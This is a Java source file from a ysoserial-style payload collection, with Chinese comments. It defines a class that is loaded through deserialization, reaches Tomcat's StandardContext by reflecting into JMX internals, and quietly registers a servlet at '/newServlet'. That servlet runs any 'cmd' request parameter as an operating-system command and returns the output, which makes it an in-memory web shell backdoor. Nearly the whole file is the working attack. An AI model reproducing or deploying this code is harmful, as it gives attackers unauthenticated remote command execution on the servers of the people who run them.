package ysoserial.payloads;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class TomcatAddServlet extends AbstractTranslet implements Servlet {
    static {
        MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
// 获取 mbsInterceptor
        Field field = null;
        StandardContext standardContext = null;
        try {
// 获取 mbsInterceptor
            field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);
// 获取 repository
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Object repository = field.get(mbsInterceptor);
// 获取 domainTb
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap<String, Map<String, NamedObject>> domainTb = (HashMap<String, Map<String, NamedObject>>) field.get(repository);
            System.out.println(domainTb);
// 获取 domain
            NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get("context=/web1_war_exploded,host=localhost,type=NamingResources");
            System.out.println(nonLoginAuthenticator);
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            Object object = field.get(nonLoginAuthenticator);
// 获取 resource
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            Object resource = field.get(object);
// 获取 context
            field = Class.forName("org.apache.catalina.deploy.NamingResourcesImpl").getDeclaredField("container");
            field.setAccessible(true);
            standardContext = (StandardContext) field.get(resource);
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("standardContext:" + standardContext);
        org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
        String n = "add_servlet";
        newWrapper.setName(n);
        newWrapper.setLoadOnStartup(1);
        Servlet servlet = new TomcatAddServlet();
        newWrapper.setServlet(servlet);
        newWrapper.setServletClass(servlet.getClass().getName());
        standardContext.addChild(newWrapper);
        standardContext.addServletMapping("/newServlet", n);
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        servletResponse.setContentType("text/html;charset=utf-8");
        PrintWriter out = servletResponse.getWriter();

        String cmd = servletRequest.getParameter("cmd");
        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in, "GBK"));
        String line = null;
        while ((line = bufferedReader.readLine()) != null) {
            out.print(line + "<br>");
        }
        out.print("add success1!!!");
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

}
